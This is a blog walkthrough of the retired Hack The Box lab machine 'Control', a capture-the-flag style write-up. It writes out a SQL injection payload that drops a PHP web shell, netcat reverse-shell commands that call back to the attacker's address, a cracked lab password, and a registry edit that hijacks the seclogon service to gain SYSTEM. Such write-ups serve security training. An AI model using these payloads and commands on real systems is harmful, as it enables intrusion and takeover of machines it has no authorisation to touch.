---
layout: post
title: "Control: Hack The Box Walkthrough"
date: 2020-04-25 17:48:34 +0000
last_modified_at: 2020-04-25 17:48:34 +0000
category: Walkthrough
tags: ["Hack The Box", Control, retired, Windows, Hard]
comments: true
image:
  feature: control-htb-walkthrough.jpg
  credit: Pexels / Pixabay
  creditlink: https://pixabay.com/photos/building-control-panel-controls-1853330/
---

This post documents the complete walkthrough of Control, a retired vulnerable [VM][1] created by [TRX][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Control is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let\'s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun1 -p1-65535,U:1-65535 10.10.10.167 --rate=500

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-11-25 07:40:50 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 135/tcp on 10.10.10.167
Discovered open port 49667/tcp on 10.10.10.167
Discovered open port 49666/tcp on 10.10.10.167
Discovered open port 3306/tcp on 10.10.10.167
Discovered open port 80/tcp on 10.10.10.167
```

Nothing unusual. Let's do one better with `nmap` scanning the discovered ports to establish their services.

```
# nmap -n -v -Pn -p80,135,3306 -A --reason -oN nmap.txt 10.10.10.167
...
PORT     STATE SERVICE REASON          VERSION
80/tcp   open  http    syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Fidelity
135/tcp  open  msrpc   syn-ack ttl 127 Microsoft Windows RPC
3306/tcp open  mysql?  syn-ack ttl 127
| fingerprint-strings:
|   FourOhFourRequest, GetRequest, LDAPSearchReq, LPDString, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SSLSessionReq, TLSSessionReq, TerminalServerCookie, WMSRequest, afp, giop, ms-sql-s:
|_    Host '10.10.15.82' is not allowed to connect to this MariaDB server
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.80%I=7%D=11/25%Time=5DDB86B6%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,4A,"F\0\0\x01\xffj\x04Host\x20'10\.10\.15\.82'\x20is\x20not\x
SF:20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(RTSPR
SF:equest,4A,"F\0\0\x01\xffj\x04Host\x20'10\.10\.15\.82'\x20is\x20not\x20a
SF:llowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(RPCCheck
SF:,4A,"F\0\0\x01\xffj\x04Host\x20'10\.10\.15\.82'\x20is\x20not\x20allowed
SF:\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(SSLSessionReq,
SF:4A,"F\0\0\x01\xffj\x04Host\x20'10\.10\.15\.82'\x20is\x20not\x20allowed\
SF:x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(TerminalServerC
SF:ookie,4A,"F\0\0\x01\xffj\x04Host\x20'10\.10\.15\.82'\x20is\x20not\x20al
SF:lowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(TLSSessio
SF:nReq,4A,"F\0\0\x01\xffj\x04Host\x20'10\.10\.15\.82'\x20is\x20not\x20all
SF:owed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(FourOhFour
SF:Request,4A,"F\0\0\x01\xffj\x04Host\x20'10\.10\.15\.82'\x20is\x20not\x20
SF:allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(LPDStri
SF:ng,4A,"F\0\0\x01\xffj\x04Host\x20'10\.10\.15\.82'\x20is\x20not\x20allow
SF:ed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(LDAPSearchRe
SF:q,4A,"F\0\0\x01\xffj\x04Host\x20'10\.10\.15\.82'\x20is\x20not\x20allowe
SF:d\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(SIPOptions,4A
SF:,"F\0\0\x01\xffj\x04Host\x20'10\.10\.15\.82'\x20is\x20not\x20allowed\x2
SF:0to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(NotesRPC,4A,"F\0\
SF:0\x01\xffj\x04Host\x20'10\.10\.15\.82'\x20is\x20not\x20allowed\x20to\x2
SF:0connect\x20to\x20this\x20MariaDB\x20server")%r(WMSRequest,4A,"F\0\0\x0
SF:1\xffj\x04Host\x20'10\.10\.15\.82'\x20is\x20not\x20allowed\x20to\x20con
SF:nect\x20to\x20this\x20MariaDB\x20server")%r(ms-sql-s,4A,"F\0\0\x01\xffj
SF:\x04Host\x20'10\.10\.15\.82'\x20is\x20not\x20allowed\x20to\x20connect\x
SF:20to\x20this\x20MariaDB\x20server")%r(afp,4A,"F\0\0\x01\xffj\x04Host\x2
SF:0'10\.10\.15\.82'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20thi
SF:s\x20MariaDB\x20server")%r(giop,4A,"F\0\0\x01\xffj\x04Host\x20'10\.10\.
SF:15\.82'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20Maria
SF:DB\x20server");
```

I'm pretty sure there's a MySQL database service behind `3306/tcp`.

{% include image.html image_alt="1e13aa78.png" image_src="/assets/images/posts/control-htb-walkthrough/1e13aa78.png" %}

That leaves us with the `http` service. This is how it looks like.

{% include image.html image_alt="619db695.png" image_src="/assets/images/posts/control-htb-walkthrough/619db695.png" %}

Oh, before I forget, the IIS is running PHP as well.

### Admin Interface Bypass

There's something interesting in the HTML source of `index.php`.

{% include image.html image_alt="002b3297.png" image_src="/assets/images/posts/control-htb-walkthrough/002b3297.png" %}

I've checked. `/myfiles` doesn't exist. And also there's this interesting message when I try to access `admin.php`.

{% include image.html image_alt="d9d672aa.png" image_src="/assets/images/posts/control-htb-walkthrough/d9d672aa.png" %}

I put two and two together, and made an educated guess. This is the client IP address that's allowed to access `admin.php`, usually through `X-Forwarded-For` type of header. To facilitate that, we can make use of Burp's Bypass WAF extension.

{% include image.html image_alt="ce2b6956.png" image_src="/assets/images/posts/control-htb-walkthrough/ce2b6956.png" %}

Set the scope to the remote machine and we are good to go.

{% include image.html image_alt="0f56c489.png" image_src="/assets/images/posts/control-htb-walkthrough/0f56c489.png" %}

Presto!

### Taking baby steps to discover SQL Injection

It's not long before I discovered a classic vulnerability with a single quote (`'`) entered into the search field: SQL injection within the `search_products.php` page.

{% include image.html image_alt="76f5a3cf.png" image_src="/assets/images/posts/control-htb-walkthrough/76f5a3cf.png" %}

Usually, we have to determine the number of columns from the `products` table but looking at above, the number of columns should be five or six. Let's enter the following into the search field.

```
' ORDER BY 7 -- -
```

{% include image.html image_alt="c68f4794.png" image_src="/assets/images/posts/control-htb-walkthrough/c68f4794.png" %}

Confirmed. The number of columns is six. Let's enter the following into the search field.

```
' UNION SELECT 1,2,3,4,5,@@VERSION -- -
```

{% include image.html image_alt="a820c474.png" image_src="/assets/images/posts/control-htb-walkthrough/a820c474.png" %}

So, the `search_products.php` page is susceptible to a UNION-based SQL injection. Time to upload a simple PHP backdoor like so.

```
<?php echo shell_exec($_GET[0]); ?>
```

Enter the following into the search field.

```
' UNION SELECT 1,2,3,4,5,"<br><pre><?php echo htmlentities(shell_exec($_GET[0])); ?></pre>" INTO OUTFILE '\\inetpub\\wwwroot\\cmd.php' -- -
```

Let's see if we can execute remote commands through PHP.

{% include image.html image_alt="abed8a8f.png" image_src="/assets/images/posts/control-htb-walkthrough/abed8a8f.png" %}

Awesome!

## Low-Privilege Shell

Time to get that shell. First, let's transfer `nc.exe` (from `/usr/share/windows-resources/binaries/nc.exe`) to a world-writable folder (like `\Windows\System32\spool\drivers\color`).

{% include image.html image_alt="176de520.png" image_src="/assets/images/posts/control-htb-walkthrough/176de520.png" %}

On one hand let's run the reverse shell back to us while `nc` listens for the incoming shell on the other hand.

{% include image.html image_alt="0f4003be.png" image_src="/assets/images/posts/control-htb-walkthrough/0f4003be.png" %}

And we have the initial foothold.

{% include image.html image_alt="21095228.png" image_src="/assets/images/posts/control-htb-walkthrough/21095228.png" %}

### Hector is in the Remote Management Users group

During enumeration of `iusr`'s account, I noticed that Hector is in the **Remote Management Users** group. That means his credentials must be lying somewhere...

{% include image.html image_alt="bf4295b3.png" image_src="/assets/images/posts/control-htb-walkthrough/bf4295b3.png" %}

### Get that hash

To be honest, I was pleasantly surprised that I could even run the following SQLi and yielded something.

```
' UNION SELECT 1,2,3,4,user, password from mysql.user -- -
```

{% include image.html image_alt="90b5db2d.png" image_src="/assets/images/posts/control-htb-walkthrough/90b5db2d.png" %}

What do we have here? Hector's password hash!

### John the Ripper

Armed with Hector's password hash, let's show John the Ripper some :heart:.

{% include image.html image_alt="0d976e8b.png" image_src="/assets/images/posts/control-htb-walkthrough/0d976e8b.png" %}

Hector's password is `l33th4x0rhector`.

### PowerShell Remoting / WinRM

Now that we have Hector's password, we can proceed to log in to Hector's account via PowerShell Remoting. But first, we need to spawn a PowerShell. To do that, we can use `nc.exe` to spawn another reverse shell and enter into PowerShell from there.

{% include image.html image_alt="c27079de.png" image_src="/assets/images/posts/control-htb-walkthrough/c27079de.png" %}

The hostname is Fidelity by the way. That's the only plot twist.

{% include image.html image_alt="ff4168b6.png" image_src="/assets/images/posts/control-htb-walkthrough/ff4168b6.png" %}

With that, we can execute Start-Process to call upon our `nc.exe` to run the third reverse shell. This time as Hector. :wink:

```
> Start-Process -FilePath \windows\system32\spool\drivers\color\cute.exe -ArgumentList "10.10.15.82 4444 -e cmd" -NoNewWindow
```

### Getting `user.txt`

The file `user.txt` is at Hector's Desktop. No surprise there.

{% include image.html image_alt="c6489ffc.png" image_src="/assets/images/posts/control-htb-walkthrough/c6489ffc.png" %}

## Privilege Escalation

During enumeration of Hector's account, I notice that Hector is able to do something special with one of the Registry keys.

{% include image.html image_alt="8b8970c1.png" image_src="/assets/images/posts/control-htb-walkthrough/8b8970c1.png" %}

I generated the above with [AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) from Microsoft SysInternals like so.

```
> accesschk.exe -klr hklm\system\currentcontrolset
```

That means that Hector is able to change the `ImagePath` of any service of my choice, but which one? The service must be in a stopped state, run as LocalSystem with no dependencies and more importantly, Hector must have the permissions to start the service.

Long story short, I chose **Secondary Logon** service or `seclogon`. Here's why.

#### Stopped state

{% include image.html image_alt="d8a86a4f.png" image_src="/assets/images/posts/control-htb-walkthrough/d8a86a4f.png" %}

#### Run as LocalSystem with no dependencies

{% include image.html image_alt="11dbfdb5.png" image_src="/assets/images/posts/control-htb-walkthrough/11dbfdb5.png" %}

#### Hector is able to start the service

{% include image.html image_alt="5f2a7c42.png" image_src="/assets/images/posts/control-htb-walkthrough/5f2a7c42.png" %}

Basically, the security descriptor string says that Hector as an Authenticated User has the Read Property (RP) of the service object, i.e. Hector can start the Secondary Logon service.

### Getting `root.txt`

To change the `ImagePath` of the `seclogon` service, we can use the very versatile `REG.EXE` command.

```
> REG DELETE HKLM\SYSTEM\CURRENTCONTROLSET\Services\seclogon /v ImagePath /f
> REG ADD HKLM\SYSTEM\CURRENTCONTROLSET\Services\seclogon /v ImagePath /t REG_SZ /d "%WINDIR%\System32\cmd.exe /c start %WINDIR%\system32\spool\drivers\color\cute.exe 10.10.15.82 5555 -e cmd.exe" /f
> sc start seclogon
```

Time to claim the prize...

{% include image.html image_alt="64d82b24.png" image_src="/assets/images/posts/control-htb-walkthrough/64d82b24.png" %}

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/218
[2]: https://www.hackthebox.eu/home/users/profile/31190
[3]: https://www.hackthebox.eu/
